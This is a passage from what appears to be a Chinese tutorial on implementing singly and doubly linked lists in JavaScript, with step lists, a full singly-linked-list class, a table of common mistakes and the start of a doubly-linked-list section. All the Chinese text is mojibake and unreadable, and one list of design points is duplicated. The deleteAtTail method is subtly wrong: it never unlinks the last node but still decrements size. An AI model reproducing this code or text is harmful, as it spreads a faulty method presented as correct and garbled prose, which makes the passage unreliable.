<li><code>isEmpty()</code>ï¼šåˆ¤æ–­é“¾è¡¨æ˜¯å¦ä¸ºç©ºï¼ˆ<code>size === 0</code>ï¼‰</li>
<li><code>get(index)</code>ï¼šè·å–æŒ‡å®šç´¢å¼•çš„èŠ‚ç‚¹å€¼
<ul>
<li>è¾¹ç•Œæ ¡éªŒï¼š<code>index &lt; 0 || index &gt;= size</code> è¿”å› <code>-1</code></li>
<li>ä»<code>dummyHead.next</code>å¼€å§‹éå†åˆ°ç›®æ ‡ä½ç½®</li>
</ul>
</li>
</ul>
<p><strong>ç¬¬å››æ­¥ï¼šå®ç°æ’å…¥æ–¹æ³•ï¼ˆæ ¸å¿ƒï¼šå…ˆè¿åæ–­ï¼‰</strong></p>
<ul>
<li>
<p><code>addAtHead(val)</code>ï¼šå¤´éƒ¨æ’å…¥</p>
<ol>
<li>åˆ›å»ºæ–°èŠ‚ç‚¹</li>
<li>æ–°èŠ‚ç‚¹<code>next</code>æŒ‡å‘åŸå¤´èŠ‚ç‚¹ï¼ˆ<code>dummyHead.next</code>ï¼‰</li>
<li><code>dummyHead.next</code>æŒ‡å‘æ–°èŠ‚ç‚¹</li>
<li>æ›´æ–°<code>size</code>ï¼Œè‹¥<code>size === 1</code>åˆ™æ›´æ–°<code>tail</code></li>
</ol>
</li>
<li>
<p><code>addAtTail(val)</code>ï¼šå°¾éƒ¨æ’å…¥</p>
<ol>
<li>è¾¹ç•Œå¤„ç†ï¼šç©ºé“¾è¡¨æ—¶è°ƒç”¨<code>addAtHead</code></li>
<li>åˆ›å»ºæ–°èŠ‚ç‚¹</li>
<li><code>tail.next</code>æŒ‡å‘æ–°èŠ‚ç‚¹</li>
<li><code>tail</code>æ›´æ–°ä¸ºæ–°èŠ‚ç‚¹</li>
<li>æ›´æ–°<code>size</code></li>
</ol>
</li>
<li>
<p><code>addAtIndex(index, val)</code>ï¼šæŒ‡å®šä½ç½®æ’å…¥</p>
<ol>
<li>è¾¹ç•Œå¤„ç†ï¼š<code>index &lt;= 0</code>è°ƒç”¨<code>addAtHead</code>ï¼Œ<code>index &gt; size</code>ç›´æ¥è¿”å›</li>
<li>éå†åˆ°æ’å…¥ä½ç½®çš„å‰é©±èŠ‚ç‚¹</li>
<li>æ–°èŠ‚ç‚¹<code>next</code>æŒ‡å‘åŸèŠ‚ç‚¹ï¼Œå‰é©±èŠ‚ç‚¹<code>next</code>æŒ‡å‘æ–°èŠ‚ç‚¹</li>
<li>è‹¥æ’å…¥åˆ°å°¾éƒ¨ï¼Œæ›´æ–°<code>tail</code></li>
<li>æ›´æ–°<code>size</code></li>
</ol>
</li>
</ul>
<p><strong>ç¬¬äº”æ­¥ï¼šå®ç°åˆ é™¤æ–¹æ³•ï¼ˆæ ¸å¿ƒï¼šå…ˆè¿åæ–­ï¼‰</strong></p>
<ul>
<li><code>deleteAtIndex(index)</code>ï¼šåˆ é™¤æŒ‡å®šä½ç½®èŠ‚ç‚¹
<ol>
<li>è¾¹ç•Œæ ¡éªŒï¼š<code>index &lt; 0 || index &gt;= size || isEmpty()</code> ç›´æ¥è¿”å›</li>
<li>éå†åˆ°åˆ é™¤ä½ç½®çš„å‰é©±èŠ‚ç‚¹</li>
<li>å‰é©±èŠ‚ç‚¹<code>next</code>æŒ‡å‘å¾…åˆ é™¤èŠ‚ç‚¹çš„<code>next</code>ï¼ˆè·³è¿‡å¾…åˆ é™¤èŠ‚ç‚¹ï¼‰</li>
<li>å¾…åˆ é™¤èŠ‚ç‚¹<code>next</code>ç½®ä¸º<code>null</code>ï¼ˆé‡Šæ”¾å¼•ç”¨ï¼‰</li>
<li>æ›´æ–°<code>size</code>ï¼Œè‹¥åˆ é™¤çš„æ˜¯å°¾èŠ‚ç‚¹ï¼Œæ›´æ–°<code>tail</code></li>
</ol>
</li>
</ul>
<p><strong>å…³é”®è®¾è®¡è¦ç‚¹ï¼š</strong></p>
<ul>
<li>âœ… ä½¿ç”¨è™šæ‹Ÿå¤´èŠ‚ç‚¹ç»Ÿä¸€è¾¹ç•Œå¤„ç†</li>
<li>âœ… ç»´æŠ¤<code>tail</code>æŒ‡é’ˆä¼˜åŒ–å°¾æ’æ“ä½œ</li>
<li>âœ… <code>size</code>ä¸<code>tail</code>çŠ¶æ€å¿…é¡»ä¸¥æ ¼åŒæ­¥</li>
<li>âœ… æ‰€æœ‰æŒ‡é’ˆæ“ä½œå‰å…ˆæ ¡éªŒè¾¹ç•Œæ¡ä»¶</li>
<li>âœ… éµå¾ª"å…ˆè¿åæ–­"åŸåˆ™ï¼šå…ˆå»ºç«‹æ–°è¿æ¥ï¼Œå†æ–­å¼€æ—§è¿æ¥</li>
<li>âœ… ä½¿ç”¨è™šæ‹Ÿå¤´èŠ‚ç‚¹ç»Ÿä¸€è¾¹ç•Œå¤„ç†</li>
<li>âœ… ç»´æŠ¤<code>tail</code>æŒ‡é’ˆä¼˜åŒ–å°¾æ’æ“ä½œ</li>
<li>âœ… <code>size</code>ä¸<code>tail</code>çŠ¶æ€å¿…é¡»ä¸¥æ ¼åŒæ­¥</li>
<li>âœ… æ‰€æœ‰æŒ‡é’ˆæ“ä½œå‰å…ˆæ ¡éªŒè¾¹ç•Œæ¡ä»¶</li>
</ul>
<h4 data-id="heading-5">2. å•é“¾è¡¨å®Œæ•´å®ç°</h4>
<pre><code class="hljs language-JavaScript" lang="JavaScript">
<span class="hljs-comment">/**
 * å•é“¾è¡¨èŠ‚ç‚¹ç±»
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">number</span>} <span class="hljs-variable">val</span> - èŠ‚ç‚¹å­˜å‚¨çš„å€¼
 */</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">LinkedNode</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">val</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">val</span> = val;       <span class="hljs-comment">// èŠ‚ç‚¹å€¼</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">next</span> = <span class="hljs-literal">null</span>;     <span class="hljs-comment">// æŒ‡å‘ä¸‹ä¸€ä¸ªèŠ‚ç‚¹çš„æŒ‡é’ˆ</span>
  }
}

<span class="hljs-comment">/**
 * å•é“¾è¡¨å®ç°
 */</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">MySinglyLinkedList</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">dummyHead</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedNode</span>(<span class="hljs-string">'_dummy'</span>); <span class="hljs-comment">// è™šæ‹Ÿå¤´èŠ‚ç‚¹</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">tail</span> = <span class="hljs-literal">null</span>;  <span class="hljs-comment">// å°¾èŠ‚ç‚¹</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">size</span> = <span class="hljs-number">0</span>;     <span class="hljs-comment">// é“¾è¡¨é•¿åº¦</span>
    <span class="hljs-comment">// çº¦æŸï¼šsize=0 æ—¶ tail=nullï¼›size&gt;0 æ—¶ tail æŒ‡å‘æœ€åä¸€ä¸ªèŠ‚ç‚¹</span>
  }

  <span class="hljs-comment">/**
   * åˆ¤æ–­é“¾è¡¨æ˜¯å¦ä¸ºç©º
   * <span class="hljs-doctag">@returns</span> {<span class="hljs-type">boolean</span>}
   */</span>
  <span class="hljs-title function_">isEmpty</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">size</span> === <span class="hljs-number">0</span>;
  }

  <span class="hljs-comment">/**
   * è·å–æŒ‡å®šç´¢å¼•çš„èŠ‚ç‚¹å€¼
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">number</span>} <span class="hljs-variable">index</span> - ç›®æ ‡ç´¢å¼•ï¼ˆä»0å¼€å§‹ï¼‰
   * <span class="hljs-doctag">@returns</span> {<span class="hljs-type">number</span>} èŠ‚ç‚¹å€¼ï¼Œç´¢å¼•æ— æ•ˆè¿”å›-1
   */</span>
  <span class="hljs-title function_">get</span>(<span class="hljs-params">index</span>) {
    <span class="hljs-keyword">if</span> (index &lt; <span class="hljs-number">0</span> || index &gt;= <span class="hljs-variable language_">this</span>.<span class="hljs-property">size</span>) <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;

    <span class="hljs-keyword">let</span> pointer = <span class="hljs-variable language_">this</span>.<span class="hljs-property">dummyHead</span>.<span class="hljs-property">next</span>;
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; index; i++) {
      pointer = pointer.<span class="hljs-property">next</span>;
    }
    <span class="hljs-keyword">return</span> pointer.<span class="hljs-property">val</span>;
  }

  <span class="hljs-comment">/**
   * å¤´éƒ¨æ’å…¥èŠ‚ç‚¹
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">number</span>} <span class="hljs-variable">val</span> - è¦æ’å…¥çš„å€¼
   */</span>
  <span class="hljs-title function_">addAtHead</span>(<span class="hljs-params">val</span>) {
    <span class="hljs-keyword">const</span> newNode = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedNode</span>(val);
    newNode.<span class="hljs-property">next</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">dummyHead</span>.<span class="hljs-property">next</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">dummyHead</span>.<span class="hljs-property">next</span> = newNode;

    <span class="hljs-variable language_">this</span>.<span class="hljs-property">size</span>++;
    <span class="hljs-comment">// ç©ºé“¾è¡¨æ’å…¥ï¼Œå°¾èŠ‚ç‚¹åŒæ­¥æ›´æ–°</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">size</span> === <span class="hljs-number">1</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">tail</span> = newNode;
    }
  }

  <span class="hljs-comment">/**
   * å°¾éƒ¨æ’å…¥èŠ‚ç‚¹
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">number</span>} <span class="hljs-variable">val</span> - è¦æ’å…¥çš„å€¼
   */</span>
  <span class="hljs-title function_">addAtTail</span>(<span class="hljs-params">val</span>) {
    <span class="hljs-comment">// åŒé‡å…œåº•æ ¡éªŒï¼šé¿å…tailä¸ºnullä½†size&gt;0çš„å¼‚å¸¸</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">isEmpty</span>() || <span class="hljs-variable language_">this</span>.<span class="hljs-property">tail</span> === <span class="hljs-literal">null</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">addAtHead</span>(val);
      <span class="hljs-keyword">return</span>;
    }

    <span class="hljs-keyword">const</span> newNode = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedNode</span>(val);
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">tail</span>.<span class="hljs-property">next</span> = newNode;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">tail</span> = newNode;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">size</span>++;
  }

  <span class="hljs-comment">/**
   * æŒ‡å®šç´¢å¼•æ’å…¥èŠ‚ç‚¹
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">number</span>} <span class="hljs-variable">index</span> - æ’å…¥ä½ç½®
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">number</span>} <span class="hljs-variable">val</span> - è¦æ’å…¥çš„å€¼
   */</span>
  <span class="hljs-title function_">addAtIndex</span>(<span class="hljs-params">index, val</span>) {
    <span class="hljs-keyword">if</span> (index &lt;= <span class="hljs-number">0</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">addAtHead</span>(val);
      <span class="hljs-keyword">return</span>;
    }
    <span class="hljs-keyword">if</span> (index &gt; <span class="hljs-variable language_">this</span>.<span class="hljs-property">size</span>) <span class="hljs-keyword">return</span>;

    <span class="hljs-keyword">let</span> pointer = <span class="hljs-variable language_">this</span>.<span class="hljs-property">dummyHead</span>;
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; index; i++) {
      pointer = pointer.<span class="hljs-property">next</span>;
    }

    <span class="hljs-keyword">const</span> newNode = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedNode</span>(val);
    newNode.<span class="hljs-property">next</span> = pointer.<span class="hljs-property">next</span>;
    pointer.<span class="hljs-property">next</span> = newNode;

    <span class="hljs-comment">// æ’å…¥åˆ°å°¾éƒ¨æ—¶æ›´æ–°tail</span>
    <span class="hljs-keyword">if</span> (index === <span class="hljs-variable language_">this</span>.<span class="hljs-property">size</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">tail</span> = newNode;
    }
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">size</span>++;
  }

  <span class="hljs-comment">/**
   * åˆ é™¤å¤´éƒ¨èŠ‚ç‚¹
   */</span>
  <span class="hljs-title function_">deleteAtHead</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">isEmpty</span>()) <span class="hljs-keyword">return</span>;

    <span class="hljs-keyword">const</span> oldHead = <span class="hljs-variable language_">this</span>.<span class="hljs-property">dummyHead</span>.<span class="hljs-property">next</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">dummyHead</span>.<span class="hljs-property">next</span> = oldHead.<span class="hljs-property">next</span>;
    oldHead.<span class="hljs-property">next</span> = <span class="hljs-literal">null</span>;

    <span class="hljs-variable language_">this</span>.<span class="hljs-property">size</span>--;
    <span class="hljs-comment">// åŒæ­¥æ›´æ–°tail</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">size</span> === <span class="hljs-number">0</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">tail</span> = <span class="hljs-literal">null</span>;
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (oldHead === <span class="hljs-variable language_">this</span>.<span class="hljs-property">tail</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">tail</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">dummyHead</span>.<span class="hljs-property">next</span>;
    }
  }

  <span class="hljs-comment">/**
   * åˆ é™¤å°¾éƒ¨èŠ‚ç‚¹
   */</span>
  <span class="hljs-title function_">deleteAtTail</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">isEmpty</span>()) <span class="hljs-keyword">return</span>;

    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">size</span> === <span class="hljs-number">1</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">deleteAtHead</span>();
      <span class="hljs-keyword">return</span>;
    }

    <span class="hljs-keyword">let</span> pointer = <span class="hljs-variable language_">this</span>.<span class="hljs-property">dummyHead</span>;
    <span class="hljs-keyword">while</span> (pointer.<span class="hljs-property">next</span>.<span class="hljs-property">next</span>) {
      pointer = pointer.<span class="hljs-property">next</span>;
    }

    pointer.<span class="hljs-property">next</span>.<span class="hljs-property">next</span> = <span class="hljs-literal">null</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">tail</span> = pointer.<span class="hljs-property">next</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">size</span>--;
  }

  <span class="hljs-comment">/**
   * åˆ é™¤æŒ‡å®šç´¢å¼•èŠ‚ç‚¹
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">number</span>} <span class="hljs-variable">index</span> - è¦åˆ é™¤çš„ç´¢å¼•
   */</span>
  <span class="hljs-title function_">deleteAtIndex</span>(<span class="hljs-params">index</span>) {
    <span class="hljs-keyword">if</span> (index &lt; <span class="hljs-number">0</span> || index &gt;= <span class="hljs-variable language_">this</span>.<span class="hljs-property">size</span> || <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">isEmpty</span>()) {
      <span class="hljs-keyword">return</span>;
    }

    <span class="hljs-keyword">let</span> pointer = <span class="hljs-variable language_">this</span>.<span class="hljs-property">dummyHead</span>;
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; index; i++) {
      pointer = pointer.<span class="hljs-property">next</span>;
    }

    <span class="hljs-keyword">const</span> nodeToDel = pointer.<span class="hljs-property">next</span>;
    pointer.<span class="hljs-property">next</span> = nodeToDel.<span class="hljs-property">next</span>;
    nodeToDel.<span class="hljs-property">next</span> = <span class="hljs-literal">null</span>;

    <span class="hljs-variable language_">this</span>.<span class="hljs-property">size</span>--;
    <span class="hljs-comment">// åŒæ­¥æ›´æ–°tail</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">size</span> === <span class="hljs-number">0</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">tail</span> = <span class="hljs-literal">null</span>;
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (nodeToDel === <span class="hljs-variable language_">this</span>.<span class="hljs-property">tail</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">tail</span> = pointer.<span class="hljs-property">next</span> || pointer;
    }
  }
}

<span class="hljs-comment">// å•é“¾è¡¨æµ‹è¯•ç”¨ä¾‹</span>
<span class="hljs-keyword">const</span> singlyList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MySinglyLinkedList</span>();
singlyList.<span class="hljs-title function_">addAtHead</span>(<span class="hljs-number">1</span>);
singlyList.<span class="hljs-title function_">addAtTail</span>(<span class="hljs-number">3</span>);
singlyList.<span class="hljs-title function_">addAtIndex</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"å•é“¾è¡¨get(1):"</span>, singlyList.<span class="hljs-title function_">get</span>(<span class="hljs-number">1</span>)); <span class="hljs-comment">// è¾“å‡º2</span>
singlyList.<span class="hljs-title function_">deleteAtIndex</span>(<span class="hljs-number">1</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"å•é“¾è¡¨get(1):"</span>, singlyList.<span class="hljs-title function_">get</span>(<span class="hljs-number">1</span>)); <span class="hljs-comment">// è¾“å‡º3</span>
</code></pre>
<h4 data-id="heading-6">3. å•é“¾è¡¨æ ¸å¿ƒæ˜“é”™ç‚¹</h4>



































<table><thead><tr><th>æ˜“é”™ç‚¹</th><th>é”™è¯¯è¡¨ç°</th><th>ä¿®å¤æ–¹æ¡ˆ</th></tr></thead><tbody><tr><td><strong>ç©ºæŒ‡é’ˆæ“ä½œ</strong></td><td><code>Cannot set properties of null (setting 'next')</code></td><td>æ‰€æœ‰æŒ‡é’ˆæ“ä½œå‰å…ˆæ ¡éªŒ<code>null</code>ï¼Œä½¿ç”¨<code>isEmpty()</code>æˆ–<code>size</code>åˆ¤æ–­</td></tr><tr><td><strong>tailçŠ¶æ€ä¸åŒæ­¥</strong></td><td>åˆ é™¤èŠ‚ç‚¹å<code>tail</code>ä»æŒ‡å‘å·²åˆ é™¤èŠ‚ç‚¹</td><td>åˆ é™¤æ“ä½œååŒæ­¥æ›´æ–°<code>tail</code>ï¼Œ<code>size=0</code>æ—¶<code>tail=null</code></td></tr><tr><td><strong>è¾¹ç•Œæ¡ä»¶é—æ¼</strong></td><td><code>index=0</code>æˆ–<code>index=size</code>æ—¶æ“ä½œå¤±è´¥</td><td>ä½¿ç”¨è™šæ‹Ÿå¤´èŠ‚ç‚¹ç»Ÿä¸€å¤„ç†ï¼Œç‰¹æ®Šä½ç½®å•ç‹¬åˆ¤æ–­</td></tr><tr><td><strong>æŒ‡é’ˆæ“ä½œé¡ºåºé”™è¯¯</strong></td><td>å…ˆæ–­å¼€åŸé“¾è¡¨å¯¼è‡´èŠ‚ç‚¹ä¸¢å¤±</td><td>éµå¾ª"å…ˆè¿åæ–­"åŸåˆ™ï¼šå…ˆå»ºç«‹æ–°è¿æ¥ï¼Œå†æ–­å¼€æ—§è¿æ¥</td></tr><tr><td><strong>sizeæœªåŒæ­¥æ›´æ–°</strong></td><td><code>size</code>ä¸å®é™…èŠ‚ç‚¹æ•°ä¸ä¸€è‡´</td><td>æ¯æ¬¡å¢/åˆ æ“ä½œå¿…é¡»åŒæ­¥æ›´æ–°<code>size</code></td></tr></tbody></table>
<p><strong>è°ƒè¯•æŠ€å·§ï¼š</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// æ·»åŠ è°ƒè¯•æ–¹æ³•ï¼šæ‰“å°é“¾è¡¨ç»“æ„</span>
<span class="hljs-title function_">toString</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> values = [];
  <span class="hljs-keyword">let</span> current = <span class="hljs-variable language_">this</span>.<span class="hljs-property">dummyHead</span>.<span class="hljs-property">next</span>;
  <span class="hljs-keyword">while</span> (current) {
    values.<span class="hljs-title function_">push</span>(current.<span class="hljs-property">val</span>);
    current = current.<span class="hljs-property">next</span>;
  }
  <span class="hljs-keyword">return</span> <span class="hljs-string">`[<span class="hljs-subst">${values.join(<span class="hljs-string">' -&gt; '</span>)}</span>] (size: <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.size}</span>, tail: <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.tail?.val ?? <span class="hljs-string">'null'</span>}</span>)`</span>;
}
</code></pre>
<h3 data-id="heading-7">ä¸‰ã€åŒå‘é“¾è¡¨ï¼ˆåŒé“¾è¡¨ï¼‰å®ç°</h3>
<h4 data-id="heading-8">1. åŒé“¾è¡¨æ ¸å¿ƒå®ç°é€»è¾‘</h4>
<h5 data-id="heading-9">ï¼ˆ1ï¼‰åŒé“¾è¡¨ä¸å•é“¾è¡¨çš„æ ¸å¿ƒå·®å¼‚</h5>
<p>å•é“¾è¡¨çš„èŠ‚ç‚¹åªæœ‰<code>next</code>æŒ‡é’ˆï¼ˆæŒ‡å‘åç»§èŠ‚ç‚¹ï¼‰ï¼Œåªèƒ½â€œå•å‘éå†â€ï¼›åŒé“¾è¡¨çš„èŠ‚ç‚¹æ–°å¢<code>prev</code>æŒ‡é’ˆï¼ˆæŒ‡å‘å‰é©±èŠ‚ç‚¹ï¼‰ï¼Œæ”¯æŒâ€œåŒå‘éå†â€ï¼Œæ ¸å¿ƒä¼˜åŠ¿ï¼š</p>
<ul>
<li>
<p>åˆ é™¤èŠ‚ç‚¹æ—¶ï¼Œæ— éœ€éå†æ‰¾å‰é©±èŠ‚ç‚¹ï¼ˆæ—¶é—´å¤æ‚åº¦ä»O(n)â†’O(1)ï¼‰ï¼›</p>
</li>
<li>
<p>æ”¯æŒä»å°¾éƒ¨åå‘éå†ï¼Œé€‚é…â€œé€†åºæ“ä½œâ€åœºæ™¯ï¼›</p>
</li>
<li>
<p>æ’å…¥/åˆ é™¤æ“ä½œæ›´çµæ´»ï¼Œè¾¹ç•Œå¤„ç†å¯é€šè¿‡â€œè™šæ‹Ÿå¤´+è™šæ‹Ÿå°¾â€è¿›ä¸€æ­¥ç®€åŒ–ã€‚</p>
</li>
</ul>
<h5 data-id="heading-10">ï¼ˆ2ï¼‰åŒé“¾è¡¨æ ¸å¿ƒè®¾è®¡è¦ç‚¹</h5>
<ul>
<li>
<p><strong>èŠ‚ç‚¹ç»“æ„</strong>ï¼šæ¯ä¸ªèŠ‚ç‚¹åŒ…å«<code>val</code>ï¼ˆå€¼ï¼‰ã€<code>prev</code>ï¼ˆå‰é©±æŒ‡é’ˆï¼‰ã€<code>next</code>ï¼ˆåç»§æŒ‡é’ˆï¼‰ï¼›</p>
</li>
<li>
<p><strong>è™šæ‹ŸèŠ‚ç‚¹</strong>ï¼šåŒæ—¶ç»´æŠ¤<code>dummyHead</code>ï¼ˆè™šæ‹Ÿå¤´ï¼‰å’Œ<code>dummyTail</code>ï¼ˆè™šæ‹Ÿå°¾ï¼‰ï¼Œå½»åº•ç»Ÿä¸€å¤´å°¾èŠ‚ç‚¹çš„æ“ä½œé€»è¾‘ï¼›</p>
</li>
<li>
<p><strong>çŠ¶æ€åŒæ­¥</strong>ï¼šç»´æŠ¤<code>size</code>ï¼ˆé•¿åº¦ï¼‰ï¼Œä¸”æ¯ä¸ªèŠ‚ç‚¹çš„<code>prev</code>/<code>next</code>æŒ‡é’ˆå¿…é¡»æˆå¯¹æ›´æ–°ï¼ˆé¿å…æŒ‡é’ˆæ‚¬ç©ºï¼‰ï¼›</p>
</li>
<li>
<p><strong>æ“ä½œåŸåˆ™</strong>ï¼šæ’å…¥/åˆ é™¤æ—¶ï¼Œå…ˆæ›´æ–°æ–°èŠ‚ç‚¹çš„<code>prev/next</code>ï¼Œå†æ›´æ–°åŸé“¾è¡¨çš„æŒ‡é’ˆï¼ˆå…ˆè¿åæ–­ï¼‰ã€‚</p>
</li>
</ul>
<h4 data-id="heading-11">å®ç°æ­¥éª¤ï¼ˆåŸºäºå•é“¾è¡¨æ‰©å±•ï¼‰</h4>
<p><strong>å‰æï¼šå·²æŒæ¡å•é“¾è¡¨å®ç°</strong>ï¼Œåœ¨æ­¤åŸºç¡€ä¸Šæ‰©å±•ä¸ºåŒé“¾è¡¨ã€‚</p>
<p><strong>ç¬¬ä¸€æ­¥ï¼šæ‰©å±•èŠ‚ç‚¹ç±»ï¼ˆæ–°å¢<code>prev</code>æŒ‡é’ˆï¼‰</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">DoublyLinkedNode</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">val</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">val</span> = val;   <span class="hljs-comment">// èŠ‚ç‚¹å€¼</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">prev</span> = <span class="hljs-literal">null</span>; <span class="hljs-comment">// æŒ‡å‘å‰é©±èŠ‚ç‚¹çš„æŒ‡é’ˆï¼ˆæ–°å¢ï¼‰</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">next</span> = <span class="hljs-literal">null</span>; <span class="hljs-comment">// æŒ‡å‘åç»§èŠ‚ç‚¹çš„æŒ‡é’ˆ</span>
  }
}
</code></pre>
<p><strong>ç¬¬äºŒæ­¥ï¼šæ‰©å±•é“¾è¡¨ç±»ç»“æ„ï¼ˆæ–°å¢è™šæ‹Ÿå°¾èŠ‚ç‚¹ï¼‰</strong></p>
<ol>
<li>ä¿ç•™è™šæ‹Ÿå¤´èŠ‚ç‚¹ï¼ˆ<code>dummyHead</code>ï¼‰ï¼šä¸å•é“¾è¡¨ç›¸åŒ</li>
<li><strong>æ–°å¢è™šæ‹Ÿå°¾èŠ‚ç‚¹ï¼ˆ<code>dummyTail</code>ï¼‰</strong>ï¼šç»Ÿä¸€å°¾èŠ‚ç‚¹æ“ä½œï¼Œé¿å…è¾¹ç•Œåˆ¤æ–­</li>
<li>åˆå§‹åŒ–è¿æ¥ï¼š<code>dummyHead.next = dummyTail</code>ï¼Œ<code>dummyTail.prev = dummyHead</code></li>
<li>åˆå§‹åŒ–é•¿åº¦ï¼ˆ<code>size</code>ï¼‰ï¼šåˆå§‹ä¸º<code>0</code></li>
</ol>
<p><strong>ç¬¬ä¸‰æ­¥ï¼šå®ç°è¾…åŠ©æ–¹æ³•ï¼ˆä¼˜åŒ–æŸ¥æ‰¾ï¼‰</strong></p>
<ul>
<li><code>getNode(index)</code>ï¼šæ ¹æ®ç´¢å¼•è·å–èŠ‚ç‚¹ï¼ˆä¼˜åŒ–ç‰ˆï¼‰
<ul>
<li>è¾¹ç•Œæ ¡éªŒï¼š<code>index &lt; 0 || index &gt;= size</code> è¿”å› <code>null</code></li>
<li><strong>ä¼˜åŒ–ç­–ç•¥</strong>ï¼šç´¢å¼•åœ¨å‰åŠæ®µä»å¤´éå†ï¼Œåœ¨ååŠæ®µä»å°¾éå†ï¼ˆæœ€åO(n/2)ï¼‰</li>
</ul>
</li>
</ul>
<p><strong>ç¬¬å››æ­¥ï¼šå®ç°æ’å…¥æ–¹æ³•ï¼ˆæ ¸å¿ƒï¼š<code>prev</code>å’Œ<code>next</code>æˆå¯¹æ›´æ–°ï¼‰</strong></p>
<ul>
<li>
<p><code>addAtHead(val)</code>ï¼šå¤´éƒ¨æ’å…¥</p>
<ol>
<li>åˆ›å»ºæ–°èŠ‚ç‚¹</li>
<li>è·å–åŸå¤´èŠ‚ç‚¹ï¼ˆ<code>dummyHead.next</code>ï¼‰</li>
<li><strong>æˆå¯¹æ›´æ–°æŒ‡é’ˆ</strong>ï¼š
<ul>
<li>æ–°èŠ‚ç‚¹ï¼š<code>prev</code>æŒ‡å‘<code>dummyHead</code>ï¼Œ<code>next</code>æŒ‡å‘åŸå¤´èŠ‚ç‚¹</li>
<li>åŸå¤´èŠ‚ç‚¹ï¼š<code>prev</code>æŒ‡å‘æ–°èŠ‚ç‚¹</li>
<li><code>dummyHead</code>ï¼š<code>next</code>æŒ‡å‘æ–°èŠ‚ç‚¹</li>
</ul>
</li>
<li>æ›´æ–°<code>size</code></li>
</ol>
</li>
<li>
<p><code>addAtTail(val)</code>ï¼šå°¾éƒ¨æ’å…¥</p>
<ol>
<li>åˆ›å»ºæ–°èŠ‚ç‚¹</li>
<li>è·å–åŸå°¾èŠ‚ç‚¹ï¼ˆ<code>dummyTail.prev</code>ï¼‰</li>
<li><strong>æˆå¯¹æ›´æ–°æŒ‡é’ˆ</strong>ï¼š
<ul>
